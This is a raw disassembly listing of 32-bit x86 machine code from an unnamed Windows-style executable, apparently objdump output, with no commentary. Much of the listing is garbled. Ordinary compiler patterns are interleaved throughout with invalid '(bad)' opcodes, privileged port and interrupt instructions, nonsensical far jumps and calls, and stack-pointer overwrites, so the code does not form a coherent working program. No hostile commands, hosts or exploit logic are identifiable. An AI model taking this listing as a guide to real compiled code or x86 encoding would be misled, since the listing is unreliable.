  408ff1:	50                   	push   %eax
  408ff2:	ff 15 b8 c1 40 00    	call   *0x40c1b8
  408ff8:	83 f8 ff             	cmp    $0xffffffff,%eax
  408ffb:	0f c7 30             	vmptrld (%eax)
  408ffe:	fe                   	(bad)
  408fff:	ff                   	(bad)
  409000:	ff 9a 62 81 f9 00    	lcall  *0xf98162(%edx)
  409006:	40                   	inc    %eax
  409007:	00 ae 0f 8f c7 1c    	add    %ch,0x1cc78f0f(%esi)
  40900d:	00 00                	add    %al,(%eax)
  40900f:	0f 84 d5 00 00 00    	je     0x4090ea
  409015:	81 2b 80 00 00 c3    	subl   $0xc3000080,(%ebx)
  40901b:	0f 84 8d c7 00 00    	je     0x4157ae
  409021:	81 f9 00 02 ae 00    	cmp    $0xae0200,%ecx
  409027:	0f 85 b1 00 00 00    	jne    0x4090de
  40902d:	8b 75 43             	mov    0x43(%ebp),%esi
  409030:	33 d2                	xor    %edx,%edx
  409032:	8b 4e 38             	mov    0x38(%esi),%ecx
  409035:	81 4b 00 02 00 00 81 	orl    $0x81000002,0x0(%ebx)
  40903c:	f9                   	stc
  40903d:	00 02                	add    %al,(%edx)
  40903f:	2c 41                	sub    $0x41,%al
  409041:	0f 94 c2             	sete   %dl
  409044:	64 d0 0c 84          	rorb   $1,%fs:(%esp,%eax,4)
  409048:	e5 a1                	in     $0xa1,%eax
  40904a:	ff                   	(bad)
  40904b:	ff 8b 4e c7 8d 45    	decl   0x458dc74e(%ebx)
  409051:	10 6a 04             	adc    %ch,0x4(%edx)
  409054:	32 6a 01             	xor    0x1(%edx),%ch
  409057:	b1 06                	mov    $0x6,%cl
  409059:	51                   	push   %ecx
  40905a:	ff 15 b8 c1 40 00    	call   *0x40c1b8
  409060:	83 f8 ff             	cmp    $0xffffffff,%eax
  409063:	75 21                	jne    0x409086
  409065:	30 e2                	xor    %ah,%dl
  409067:	bc c1 40 00 ff       	mov    $0xff0040c1,%esp
  40906c:	cb                   	lret
  40906d:	85 c0                	test   %eax,%eax
  40906f:	75 7a                	jne    0x4090eb
  409071:	5e                   	pop    %esi
  409072:	8b e5                	mov    %ebp,%esp
  409074:	5d                   	pop    %ebp
  409075:	da 0c 00             	fimull (%eax,%eax,1)
  409078:	ff d6                	call   *%esi
  40907a:	05 80 fc f8 00       	add    $0xf8fc80,%eax
  40907f:	1b 8b e5 7e c2 0c    	sbb    0xcc27ee5(%ebx),%ecx
  409085:	00 8b c4 10 a1 af    	add    %cl,-0x505eef3c(%ebx)
  40908b:	8b 46 38             	mov    0x38(%esi),%eax
  40908e:	74 0f                	je     0x40909f
  409090:	80 e2 02             	and    $0x2,%dl
  409093:	89 46 38             	mov    %eax,0x38(%esi)
  409096:	33 c0                	xor    %eax,%eax
  409098:	52                   	push   %edx
  409099:	8b e5                	mov    %ebp,%esp
  40909b:	5d                   	pop    %ebp
  40909c:	c2 0c 00             	ret    $0xc
  40909f:	80 e4 32             	and    $0x32,%ah
  4090a2:	b7 46                	mov    $0x46,%bh
  4090a4:	38 33                	cmp    %dh,(%ebx)
  4090a6:	c0 5e 8b e5          	rcrb   $0xe5,-0x75(%esi)
  4090aa:	5d                   	pop    %ebp
  4090ab:	c2 77 00             	ret    $0x77
  4090ae:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4090b1:	8d 55 37             	lea    0x37(%ebp),%edx
  4090b4:	6a 1f                	push   $0x1f
  4090b6:	52                   	push   %edx
  4090b7:	8b 48 04             	mov    0x4(%eax),%ecx
  4090ba:	68 02 10 00 00       	push   $0x1002
  4090bf:	68 ff ff 00 00       	push   $0xffff
  4090c4:	aa                   	stos   %al,%es:(%edi)
  4090c5:	ff 15 b8 c2 9f e2    	call   *0xe29fc2b8
  4090cb:	83 a8 ff 0f 85 5d fd 	subl   $0xfffffffd,0x5d850fff(%eax)
  4090d2:	ff                   	(bad)
  4090d3:	ff aa 8f 81 f9 00    	ljmp   *0xf9818f(%edx)
  4090d9:	80 5d bb 74          	sbbb   $0x74,-0x45(%ebp)
  4090dd:	0c b8                	or     $0xb8,%al
  4090df:	16                   	push   %ss
  4090e0:	00 00                	add    %al,(%eax)
  4090e2:	56                   	push   %esi
  4090e3:	5e                   	pop    %esi
  4090e4:	8b e5                	mov    %ebp,%esp
  4090e6:	5d                   	pop    %ebp
  4090e7:	c2 e5 00             	ret    $0xe5
  4090ea:	b8 f5 11 01 00       	mov    $0x111f5,%eax
  4090ef:	5e                   	pop    %esi
  4090f0:	8b e5                	mov    %ebp,%esp
  4090f2:	5d                   	pop    %ebp
  4090f3:	5b                   	pop    %ebx
  4090f4:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4090f5:	a1 81 ff 70 31       	mov    0x3170ff81,%eax
  4090fa:	40                   	inc    %eax
  4090fb:	00 ed                	add    %ch,%ch
  4090fd:	8d 40 00             	lea    0x0(%eax),%eax
  409100:	48                   	dec    %eax
  409101:	8e 40 01             	mov    0x1(%eax),%es
  409104:	02 97 40 00 b2 8e    	add    -0x714dffc0(%edi),%dl
  40910a:	40                   	inc    %eax
  40910b:	00 de                	add    %bl,%dh
  40910d:	90                   	nop
  40910e:	94                   	xchg   %eax,%esp
  40910f:	00 00                	add    %al,(%eax)
  409111:	01 21                	add    %esp,(%ecx)
  409113:	02 05 05 05 0d 05    	add    0x50d0505,%al
  409119:	05 05 05 05 05       	add    $0x5050505,%eax
  40911e:	05 04 55 8b ec       	add    $0xec8b5504,%eax
  409123:	83 ec 2c             	sub    $0x2c,%esp
  409126:	8b 45 10             	mov    0x10(%ebp),%eax
  409129:	8b 82 0c 56 57 50    	mov    0x5057560c(%edx),%eax
  40912f:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  409132:	51                   	push   %ecx
  409133:	52                   	push   %edx
  409134:	e8 d7 d9 ff 7d       	call   0x7e406b10
  409139:	bb 45 f0 8b 4d       	mov    $0x4d8bf045,%ebx
  40913e:	d1 41 be             	roll   $1,-0x42(%ecx)
  409141:	0a a6 00 00 8a 14    	or     0x148a0000(%esi),%ah
  409147:	85 d8                	test   %ebx,%eax
  409149:	c4 40 00             	les    0x0(%eax),%eax
  40914c:	8d 04 eb             	lea    (%ebx,%ebp,8),%eax
  40914f:	d8 cc                	fmul   %st(4),%st
  409151:	40                   	inc    %eax
  409152:	00 88 91 b9 40 41    	add    %cl,0x4140b991(%eax)
  409158:	8a 10                	mov    (%eax),%dl
  40915a:	88 51 ff             	mov    %dl,-0x1(%ecx)
  40915d:	8a 40 01             	mov    0x1(%eax),%al
  409160:	8b 9a 5a 88 0a 41    	mov    0x410a885a(%edx),%ebx
  409166:	8d 04 95 a8 c4 2a 00 	lea    0x2ac4a8(,%edx,4),%eax
  40916d:	c6 01 20             	movb   $0x20,(%ecx)
  409170:	41                   	inc    %ecx
  409171:	8a b0 a1 11 f3 50    	mov    0x50f311a1(%eax),%dh
  409177:	01 41 40             	add    %eax,0x40(%ecx)
  40917a:	82 11 0d             	adcb   $0xd,(%ecx)
  40917d:	40                   	inc    %eax
  40917e:	d2 fe                	sar    %cl,%dh
  409180:	88 01                	mov    %al,(%ecx)
  409182:	09 45 e4             	or     %eax,-0x1c(%ebp)
  409185:	99                   	cltd
  409186:	3f                   	aas
  409187:	fe 41 69             	incb   0x69(%ecx)
  40918a:	01 20                	add    %esp,(%eax)
  40918c:	41                   	inc    %ecx
  40918d:	04 30                	add    $0x30,%al
  40918f:	80 c2 30             	add    $0x30,%dl
  409192:	88 01                	mov    %al,(%ecx)
  409194:	8b 45 e0             	mov    -0x20(%ebp),%eax
  409197:	41                   	inc    %ecx
  409198:	88 11                	mov    %dl,(%ecx)
  40919a:	41                   	inc    %ecx
  40919b:	99                   	cltd
  40919c:	f7 fe                	idiv   %esi
  40919e:	c6 01 20             	movb   $0x20,(%ecx)
  4091a1:	41                   	inc    %ecx
  4091a2:	04 30                	add    $0x30,%al
  4091a4:	80 c2 30             	add    $0x30,%dl
  4091a7:	88 01                	mov    %al,(%ecx)
  4091a9:	0e                   	push   %cs
  4091aa:	45                   	inc    %ebp
  4091ab:	ec                   	in     (%dx),%al
  4091ac:	41                   	inc    %ecx
  4091ad:	67 11 0e 99 f7       	adc    %ecx,-0x867
  4091b2:	fe c6                	inc    %dh
  4091b4:	01 3a                	add    %edi,(%edx)
  4091b6:	41                   	inc    %ecx
  4091b7:	04 30                	add    $0x30,%al
  4091b9:	5f                   	pop    %edi
  4091ba:	c2 30 88             	ret    $0x8830
  4091bd:	01 8b 45 d8 41 88    	add    %ecx,-0x77be27bb(%ebx)
  4091c3:	11 28                	adc    %ebp,(%eax)
  4091c5:	99                   	cltd
  4091c6:	f7 fe                	idiv   %esi
  4091c8:	c6 01 3a             	movb   $0x3a,(%ecx)
  4091cb:	7f 23                	jg     0x4091f0
  4091cd:	30 80 c2 ac 88 01    	xor    %al,0x188acc2(%eax)
  4091d3:	41                   	inc    %ecx
  4091d4:	88 11                	mov    %dl,(%ecx)
  4091d6:	41                   	inc    %ecx
  4091d7:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4091da:	bf e8 03 fd 36       	mov    $0x36fd03e8,%edi
  4091df:	c6 01 20             	movb   $0x20,(%ecx)
  4091e2:	41                   	inc    %ecx
  4091e3:	b6 b2                	mov    $0xb2,%dh
  4091e5:	6c                   	insb   (%dx),%es:(%edi)
  4091e6:	07                   	pop    %es
  4091e7:	00 00                	add    %al,(%eax)
  4091e9:	ac                   	lods   %ds:(%esi),%al
  4091ea:	c6                   	(bad)
  4091eb:	62 f7 ff bf ae       	(bad) {%k7}{z}
  4091f0:	00 00                	add    %al,(%eax)
  4091f2:	00 04 87             	add    %al,(%edi,%eax,4)
  4091f5:	45                   	inc    %ebp
  4091f6:	8e b8 1f be eb 71    	mov    0x71ebbe1f(%eax),%?
  4091fc:	0c ea                	or     $0xea,%al
  4091fe:	c1 fa 05             	sar    $0x5,%edx
  409201:	81 c2 41 c1 e8 d2    	add    $0xd2e8c141,%edx
  409207:	03 4e fe             	add    -0x2(%esi),%ecx
  40920a:	86 80 c2 30 88 11    	xchg   %al,0x118830c2(%eax)
  409210:	41                   	inc    %ecx
  409211:	99                   	cltd
  409212:	ca ff b8             	lret   $0xb8ff
  409215:	67 66 66 66 03 f7    	addr16 data16 data16 add %di,%si
  40921b:	ea c1 fa 02 8b c2 c1 	ljmp   $0xc1c2,$0x8b02fac1
  409222:	5e                   	pop    %esi
  409223:	1f                   	pop    %ds
  409224:	03 d0                	add    %eax,%edx
  409226:	de c6                	faddp  %st,%st(6)
  409228:	80 c2 30             	add    $0x30,%dl
  40922b:	be 23 1f 00 0d       	mov    $0xd001f23,%esi
  409230:	8a 11                	mov    (%ecx),%dl
  409232:	70 99                	jo     0x4091cd
  409234:	ef                   	out    %eax,(%dx)
  409235:	fe                   	(bad)
  409236:	5e                   	pop    %esi
  409237:	80 51 30 33          	adcb   $0x33,0x30(%ecx)
  40923b:	9d                   	popf
  40923c:	88 dd                	mov    %bl,%ch
  40923e:	c6                   	(bad)
  40923f:	93                   	xchg   %eax,%ebx
  409240:	01 00                	add    %eax,(%eax)
  409242:	54                   	push   %esp
  409243:	e5 5d                	in     $0x5d,%eax
  409245:	c2 0c 00             	ret    $0xc
  409248:	84 ab 90 90 90 90    	test   %ch,-0x6f6f6f70(%ebx)
  40924e:	90                   	nop
  40924f:	90                   	nop
  409250:	f9                   	stc
  409251:	a3 ec 30 8b 30       	mov    %eax,0x308b30ec
  409256:	10 56 57             	adc    %dl,0x57(%esi)
  409259:	8b fb                	mov    %ebx,%edi
  40925b:	83 c9 ff             	or     $0xffffffff,%ecx
  40925e:	33 c0                	xor    %eax,%eax
  409260:	8b 7e 41             	mov    0x41(%esi),%edi
  409263:	f2 ae                	repnz scas %es:(%edi),%al
  409265:	d8 d1                	fcom   %st(1)
  409267:	81 f9 f8 00 00 00    	cmp    $0xf8,%ecx
  40926d:	89 4d a2             	mov    %ecx,-0x5e(%ebp)
  409270:	76 6b                	jbe    0x4092dd
  409272:	8a 53 01             	mov    0x1(%ebx),%dl
  409275:	80 fa 3a             	cmp    $0x3a,%dl
  409278:	75 25                	jne    0x40929f
  40927a:	8a 43 02             	mov    0x2(%ebx),%al
  40927d:	3c 2f                	cmp    $0x2f,%al
  40927f:	74 04                	je     0x409285
  409281:	95                   	xchg   %eax,%ebp
  409282:	5c                   	pop    %esp
  409283:	75 1a                	jne    0x40929f
  409285:	d4 e0                	aam    $0xe0
  409287:	00 0a                	add    %cl,(%edx)
  409289:	00 ef                	add    %ch,%bh
  40928b:	ff 15 be c1 32 00    	call   *0x32c1be
  409291:	8b 45 0c             	mov    0xc(%ebp),%eax
  409294:	83 c4 08             	add    $0x8,%esp
  409297:	e1 e8                	loope  0x409281
  409299:	04 bf                	add    $0xbf,%al
  40929b:	c6                   	(bad)
  40929c:	08 eb                	or     %ch,%bl
  40929e:	d5 8a                	aad    $0x8a
  4092a0:	d4 3c                	aam    $0x3c
  4092a2:	2f                   	das
  4092a3:	74 04                	je     0x4092a9
  4092a5:	c3                   	ret
  4092a6:	43                   	inc    %ebx
  4092a7:	61                   	popa
  4092a8:	34 80                	xor    $0x80,%al
  4092aa:	fa                   	cli
  4092ab:	2f                   	das
  4092ac:	74 05                	je     0x4092b3
  4092ae:	80 b3 5c 49 2a 80 19 	xorb   $0x19,-0x7fd5b6a4(%ebx)
  4092b5:	02 36                	add    (%esi),%dh
  4092b7:	74 24                	je     0x4092dd
  4092b9:	83 e9 02             	sub    $0x2,%ecx
  4092bc:	68 cc 00 41 00       	push   $0x4100cc
  4092c1:	56                   	push   %esi
  4092c2:	83 c3 02             	add    $0x2,%ebx
  4092c5:	89 77 10             	mov    %esi,0x10(%edi)
  4092c8:	79 15                	jns    0x4092df
  4092ca:	10 c1                	adc    %al,%cl
  4092cc:	40                   	inc    %eax
  4092cd:	00 8b 91 0c 83 c4    	add    %cl,-0x3b7cf36f(%ebx)
  4092d3:	93                   	xchg   %eax,%ebx
  4092d4:	83 e8 08             	sub    $0x8,%eax
  4092d7:	83 c6 10             	add    $0x10,%esi
  4092da:	89 9d 0c 8d 45 0c    	mov    %ebx,0xc458d0c(%ebp)
  4092e0:	8d 4d 10             	lea    0x10(%ebp),%ecx
  4092e3:	50                   	push   %eax
  4092e4:	56                   	push   %esi
  4092e5:	51                   	push   %ecx
  4092e6:	c2 e8 b4             	ret    $0xb4e8
  4092e9:	16                   	push   %ss
  4092ea:	11 00                	adc    %eax,(%eax)
  4092ec:	85 c0                	test   %eax,%eax
  4092ee:	d2 11                	rclb   %cl,(%ecx)
  4092f0:	89 78 11             	mov    %edi,0x11(%eax)
  4092f3:	01 00                	add    %eax,(%eax)
  4092f5:	75 00                	jne    0x4092f7
  4092f7:	5f                   	pop    %edi
  4092f8:	5e                   	pop    %esi
  4092f9:	bc 16 00 00 00       	mov    $0x16,%esp
  4092fe:	5b                   	pop    %ebx
  4092ff:	c3                   	ret
  409300:	c3                   	ret
  409301:	d8 45 10             	fadds  0x10(%ebp)
  409304:	85 c0                	test   %eax,%eax
  409306:	74 25                	je     0x40932d
  409308:	eb f4                	jmp    0x4092fe
  40930a:	b8 26 00 00 00       	mov    $0x26,%eax
  40930f:	5b                   	pop    %ebx
  409310:	5d                   	pop    %ebp
  409311:	c3                   	ret
  409312:	66 8b d7             	mov    %di,%dx
  409315:	66 1e                	pushw  %ds
  409317:	c0 74 17 66 e9       	shlb   $0xe9,0x66(%edi,%edx,1)
  40931c:	41                   	inc    %ecx
  40931d:	00 75 05             	add    %dh,0x5(%ebp)
  409320:	66 c7                	data16 (bad)
  409322:	6f                   	outsl  %ds:(%esi),(%dx)
  409323:	5c                   	pop    %esp
  409324:	00 66 8b             	add    %ah,-0x75(%esi)
  409327:	17                   	pop    %ss
  409328:	02 83 c6 02 66 85    	add    -0x7a99fd3a(%ebx),%al
  40932e:	c0 41 e9 33          	rolb   $0x33,-0x17(%ecx)
  409332:	36 5f                	ss pop %edi
  409334:	5e                   	pop    %esi
  409335:	19 5d c3             	sbb    %ebx,-0x3d(%ebp)
  409338:	90                   	nop
  409339:	90                   	nop
  40933a:	90                   	nop
  40933b:	90                   	nop
  40933c:	90                   	nop
  40933d:	90                   	nop
  40933e:	90                   	nop
  40933f:	24 55                	and    $0x55,%al
  409341:	8b ec                	mov    %esp,%ebp
  409343:	56                   	push   %esi
  409344:	8b 75 08             	mov    0x8(%ebp),%esi
  409347:	57                   	push   %edi
  409348:	33 ff                	xor    %edi,%edi
  40934a:	44                   	inc    %esp
  40934b:	4a                   	dec    %edx
  40934c:	04 ff                	add    $0xff,%al
  40934e:	0f 84 84 00 00 00    	je     0x4093d8
  409354:	19 46 2c             	sbb    %eax,0x2c(%esi)
  409357:	84 c0                	test   %al,%al
  409359:	74 bb                	je     0x409316
  40935b:	56                   	push   %esi
  40935c:	e8 6f 1f 00 6a       	call   0x6a40b2d0
  409361:	40                   	inc    %eax
  409362:	f8                   	clc
  409363:	8b 46 18             	mov    0x18(%esi),%eax
  409366:	25 00 00 7e 06       	and    $0x67e0000,%eax
  40936b:	13 38                	adc    (%eax),%edi
  40936d:	3d 00 00 00 06       	cmp    $0x6000000,%eax
  409372:	d7                   	xlat   %ds:(%ebx)
  409373:	17                   	pop    %ss
  409374:	6a 02                	push   $0x2
  409376:	ff 15 08 fa 40 00    	call   *0x40fa08
  40937c:	83 c4 04             	add    $0x4,%esp
  40937f:	6a ff                	push   $0xffffffff
  409381:	6a f4                	push   $0xfffffff4
  409383:	ff 15 a4 c0 40 00    	call   *0x40c0a4
  409389:	eb de                	jmp    0x409369
  40938b:	3d 00 00 00 4e       	cmp    $0x4e000000,%eax
  409390:	75 17                	jne    0x4093a9
  409392:	6a 01                	push   $0x1
  409394:	ff                   	(bad)
  409395:	fc                   	cld
  409396:	08 c1                	or     %al,%cl
  409398:	40                   	inc    %eax
  409399:	00 13                	add    %dl,(%ebx)
  40939b:	c4 04 6a             	les    (%edx,%ebp,2),%eax
  40939e:	ff                   	(bad)
  40939f:	7a f5                	jp     0x409396
  4093a1:	dd d2                	fst    %st(2)
  4093a3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4093a4:	c0 8d c3 2f 8f 5c 93 	rorb   $0x93,0x5c8f2fc3(%ebp)
  4093ab:	00 e1                	add    %ah,%cl
  4093ad:	b7 75                	mov    $0x75,%bh
  4093af:	21 6a 00             	and    %ebp,0x0(%edx)
  4093b2:	ff 15 08 c1 40 00    	call   *0x40c108
  4093b8:	25 c4 04 6a ff       	and    $0xff6a04c4,%eax
  4093bd:	6a 11                	push   $0x11
  4093bf:	ff 15 a4 c0 40 00    	call   *0x40c0a4
  4093c5:	eb 74                	jmp    0x40943b
  4093c7:	8b 46 04             	mov    0x4(%esi),%eax
  4093ca:	71 ff                	jno    0x4093cb
  4093cc:	c1 74 c0 40 00       	shll   $0x0,0x40(%eax,%eax,8)
  4093d1:	c7 46 e3 ff 73 8c ff 	movl   $0xff8c73ff,-0x1d(%esi)
  4093d8:	8b 46 0c             	mov    0xc(%esi),%eax
  4093db:	85 c0                	test   %eax,%eax
  4093dd:	eb 15                	jmp    0x4093f4
  4093df:	5c                   	pop    %esp
  4093e0:	40                   	inc    %eax
  4093e1:	10 85 c0 74 0e db    	adc    %al,-0x24f18b40(%ebp)
  4093e7:	4e                   	dec    %esi
  4093e8:	15 07 c0 40 00       	adc    $0x40c007,%eax
  4093ed:	c7 46 59 00 00 00 00 	movl   $0x0,0x59(%esi)
  4093f4:	8b c7                	mov    %edi,%eax
  4093f6:	5f                   	pop    %edi
  4093f7:	ab                   	stos   %eax,%es:(%edi)
  4093f8:	5d                   	pop    %ebp
  4093f9:	c3                   	ret
  4093fa:	ce                   	into
  4093fb:	90                   	nop
  4093fc:	90                   	nop
  4093fd:	90                   	nop
  4093fe:	90                   	nop
  4093ff:	90                   	nop
  409400:	55                   	push   %ebp
  409401:	8b 9c b8 6a 40 00 00 	mov    0x406a(%eax,%edi,4),%ebx
  409408:	e8 33 24 8f 00       	call   0xcfb840
  40940d:	58                   	pop    %eax
  40940e:	8b 87 10 56 57 33    	mov    0x33575610(%edi),%eax
  409414:	ff c7                	inc    %edi
  409416:	45                   	inc    %ebp
  409417:	f8                   	clc
  409418:	03 be 67 00 f6 c3    	add    -0x3c09ff99(%esi),%edi
  40941e:	01 89 7d fc 74 c6    	add    %ecx,-0x398b0383(%ecx)
  409424:	c7 42 fc 00 f1 00 80 	movl   $0x8000f100,-0x4(%edx)
  40942b:	f6 c3 18             	test   $0x18,%bl
  40942e:	74 07                	je     0x409437
  409430:	81 3e b1 00 00 59    	cmpl   $0x590000b1,(%esi)
  409436:	40                   	inc    %eax
  409437:	f7 c3 00 00 bc 08    	test   $0x8bc0000,%ebx
  40943d:	90                   	nop
  40943e:	09 8b 45 fc 80 62    	or     %ecx,0x6280fc45(%ebx)
  409444:	08 89 45 fc 8b 0d    	or     %cl,0xd8bfc45(%ecx)
  40944a:	dc 08                	fmull  (%eax)
  40944c:	81 49 83 e4 1e 22 84 	orl    $0x84221ee4,-0x7d(%ecx)
  409453:	1f                   	pop    %ds
  409454:	45                   	inc    %ebp
  409455:	f8                   	clc
  409456:	07                   	pop    %es
  409457:	fa                   	cli
  409458:	00 00                	add    %al,(%eax)
  40945a:	73 15                	jae    0x409471
  40945c:	6d                   	insl   (%dx),%es:(%edi)
  40945d:	e0 04                	loopne 0x409463
  40945f:	74 1d                	je     0x40947e
  409461:	a8 c3                	test   $0xc3,%al
  409463:	ff 74 07 be          	push   -0x42(%edi,%eax,1)
  409467:	61                   	popa
  409468:	00 00                	add    %al,(%eax)
  40946a:	00 eb                	add    %ch,%bl
  40946c:	4f                   	dec    %edi
  40946d:	8a d3                	mov    %bl,%dl
  40946f:	80 e2 10             	and    $0x10,%dl
  409472:	f6 da                	neg    %dl
  409474:	1b d2                	sbb    %edx,%edx
  409476:	66 e8 0e 83          	callw  0x1788
  40947a:	c2 04 eb             	ret    $0xeb04
  40947d:	0f 8a f4 b4 6b 10    	jp     0x10ac4977
  409483:	f6 da                	neg    %dl
  409485:	1b d2                	sbb    %edx,%edx
  409487:	83 e2 02             	and    $0x2,%edx
  40948a:	83 5c 03 8b f2       	sbbl   $0xfffffff2,-0x75(%ebx,%eax,1)
  40948f:	56                   	push   %esi
  409490:	c3                   	ret
  409491:	4f                   	dec    %edi
  409492:	74 12                	je     0x4094a6
  409494:	85 c0                	test   %eax,%eax
  409496:	75 18                	jne    0x4094b0
  409498:	ba 5e b8 0d 00       	mov    $0xdb85e,%edx
  40949d:	00 00                	add    %al,(%eax)
  40949f:	5b                   	pop    %ebx
  4094a0:	8b e5                	mov    %ebp,%esp
  4094a2:	b9 c2 e7 00 bf       	mov    $0xbf00e7c2,%ecx
  4094a7:	c7 01 74 05 bf 00    	movl   $0xbf0574,(%ecx)
  4094ad:	e9 00 04 f7 c3       	jmp    0xc43798b2
  4094b2:	00 3e                	add    %bh,(%esi)
  4094b4:	fa                   	cli
  4094b5:	00 ca                	add    %cl,%dl
  4094b7:	06                   	push   %es
  4094b8:	81 cf 00 00 20 00    	or     $0x200000,%edi
  4094be:	83 c3 03             	add    $0x3,%ebx
  4094c1:	75 22                	jne    0x4094e5
  4094c3:	f7 c3 00 00 10 00    	test   $0x100000,%ebx
  4094c9:	cb                   	lret
  4094ca:	cd 8f                	int    $0x8f
  4094cc:	f9                   	stc
  4094cd:	2b 7c e2 81          	sub    -0x7f(%edx,%eiz,8),%edi
  4094d1:	cf                   	iret
  4094d2:	00 00                	add    %al,(%eax)
  4094d4:	00 02                	add    %al,(%edx)
  4094d6:	f7 f2                	div    %edx
  4094d8:	00 0c 40             	add    %cl,(%eax,%eax,2)
  4094db:	00 74 07 81          	add    %dh,-0x7f(%edi,%eax,1)
  4094df:	4d                   	dec    %ebp
  4094e0:	fc                   	cld
  4094e1:	00 00                	add    %al,(%eax)
  4094e3:	c8 00 f6 c7          	enter  $0xf600,$0xc7
  4094e7:	02 74 06 81          	add    -0x7f(%esi,%eax,1),%dh
  4094eb:	cf                   	iret
  4094ec:	00 00                	add    %al,(%eax)
  4094ee:	00 40 83             	add    %al,-0x7d(%eax)
  4094f1:	f9                   	stc
  4094f2:	14 7c                	adc    $0x7c,%al
  4094f4:	49                   	dec    %ecx
  4094f5:	f6 c7 a8             	test   $0xa8,%bh
  4094f8:	74 09                	je     0x409503
  4094fa:	80 cf 02             	or     $0x2,%bh
  4094fd:	1e                   	push   %ds
  4094fe:	cf                   	iret
  4094ff:	00 00                	add    %al,(%eax)
  409501:	b8 48 8b 05 0c       	mov    $0xc058b48,%eax
  409506:	8d 8d f8 bf ff ff    	lea    -0x4008(%ebp),%ecx
  40950c:	1e                   	push   %ds
  40950d:	68 00 20 00 00       	push   $0x2000
  409512:	3f                   	aas
  409513:	e8 38 fd ff ff       	call   0x409250
  409518:	83 c4 8a             	add    $0xffffff8a,%esp
  40951b:	cf                   	iret
  40951c:	c0 0f 85             	rorb   $0x85,(%edi)
  40951f:	91                   	xchg   %eax,%ecx
  409520:	01 00                	add    %eax,(%eax)
  409522:	00 8b 55 f8 50 57    	add    %cl,0x5750f855(%ebx)
  409528:	8d 50 8b             	lea    -0x75(%eax),%edx
  40952b:	45                   	inc    %ebp
  40952c:	fc                   	cld
  40952d:	52                   	push   %edx
  40952e:	8d                   	lea    (bad),%esi
  40952f:	f1                   	int1
  409530:	1b b4 ff ff 50 51 aa 	sbb    -0x55aeaf01(%edi,%edi,8),%esi
  409537:	15 b0 c0 40 00       	adc    $0x40c0b0,%eax
  40953c:	52                   	push   %edx
  40953d:	1b 8b 55 a6 8b 45    	sbb    0x458ba655(%ebx),%ecx
  409543:	fc                   	cld
  409544:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  409547:	6a 00                	push   $0x0
  409549:	57                   	push   %edi
  40954a:	56                   	push   %esi
  40954b:	6a 74                	push   $0x74
  40954d:	52                   	push   %edx
  40954e:	50                   	push   %eax
  40954f:	51                   	push   %ecx
  409550:	95                   	xchg   %eax,%ebp
  409551:	15 ac 2c 40 00       	adc    $0x402cac,%eax
  409556:	f0 e7 ef             	lock out %eax,$0xef
  409559:	45                   	inc    %ebp
  40955a:	c2 ff 89             	ret    $0x89ff
  40955d:	45                   	inc    %ebp
  40955e:	10 75 20             	adc    %dh,0x20(%ebp)
  409561:	8b 35 98 a1 40 00    	mov    0x40a198,%esi
  409567:	ff 4b 85             	decl   -0x7b(%ebx)
  40956a:	a9 df 84 41 01       	test   $0x14184df,%eax
  40956f:	00 00                	add    %al,(%eax)
  409571:	ff d6                	call   *%esi
  409573:	08 5e 05             	or     %bl,0x5(%esi)
  409576:	80 21 0a             	andb   $0xa,(%ecx)
  409579:	00 5b d7             	add    %bl,-0x29(%ebx)
  40957c:	e5 5d                	in     $0x5d,%eax
  40957e:	c2 14 00             	ret    $0x14
  409581:	8b 55 18             	mov    0x18(%ebp),%edx
  409584:	6a 60                	push   $0x60
  409586:	52                   	push   %edx
  409587:	e8 d4 b4 ff ff       	call   0x404a60
  40958c:	2d 75 08 8b 52       	sub    $0x528b0875,%eax
  409591:	33 c0                	xor    %eax,%eax
  409593:	8b d7                	mov    %edi,%edx
  409595:	e9 18 00 00 00       	jmp    0x4095b2
  40959a:	c6                   	(bad)
  40959b:	ab                   	stos   %eax,%es:(%edi)
  40959c:	8b 7d 18             	mov    0x18(%ebp),%edi
  40959f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4095a2:	78 16                	js     0x4095ba
  4095a4:	89 3a                	mov    %edi,(%edx)
  4095a6:	8b 55 0c             	mov    0xc(%ebp),%edx
  4095a9:	8b 70 52             	mov    0x52(%eax),%esi
  4095ac:	57                   	push   %edi
  4095ad:	89 48 04             	mov    %ecx,0x4(%eax)
  4095b0:	e8 7d c2 ff ff       	call   0x405832
  4095b5:	8b 0e                	mov    (%esi),%ecx
  4095b7:	89 41 da             	mov    %eax,-0x26(%ecx)
  4095ba:	8b 16                	mov    (%esi),%edx
  4095bc:	a0 c8 ff ea 5a       	mov    0x5aeaffc8,%al
  4095c1:	18 8b a1 19 c3 e8    	sbb    %cl,-0x173ce65f(%ebx)
  4095c7:	89 41 10             	mov    %eax,0x10(%ecx)
  4095ca:	89 ec                	mov    %ebp,%esp
  4095cc:	14 8b                	adc    $0x8b,%al
  4095ce:	f4                   	hlt
  4095cf:	fa                   	cli
  4095d0:	f2 30 74 1b 8b       	repnz xor %dh,-0x75(%ebx,%ebx,1)
  4095d5:	06                   	push   %es
  4095d6:	6a e0                	push   $0xffffffe0
  4095d8:	6a 00                	push   $0x0
  4095da:	6a 00                	push   $0x0
  4095dc:	23 40 52             	and    0x52(%eax),%eax
  4095df:	01 00                	add    %eax,(%eax)
  4095e1:	00 00                	add    %al,(%eax)
  4095e3:	8b 0e                	mov    (%esi),%ecx
  4095e5:	8b 83 21 52 ff 15    	mov    0x15ff5221(%ebx),%eax
  4095eb:	a8 c0                	test   $0xc0,%al
  4095ed:	40                   	inc    %eax
  4095ee:	00 84 db 79 1f 8b 06 	add    %al,0x68b1f79(%ebx,%ebx,8)
  4095f5:	68 00 10 00 00       	push   $0x1000
  4095fa:	f7 c6 40 2c e1 2b    	test   $0x2be12c40,%esi
  409600:	5c                   	pop    %esp
  409601:	b4 ff                	mov    $0xff,%ah
  409603:	ff 8b 0e 89 22 0d    	decl   0xd22890e(%ebx)
  409609:	8b 16                	mov    (%esi),%edx
  40960b:	c7 42 40 dd 10 00 00 	movl   $0x10dd,0x40(%edx)
  409612:	8b 06                	mov    (%esi),%eax
  409614:	8a 48 2c             	mov    0x2c(%eax),%cl
  409617:	84 c9                	test   %cl,%cl
  409619:	75 07                	jne    0x409622
  40961b:	8b 48 34             	mov    0x34(%eax),%ecx
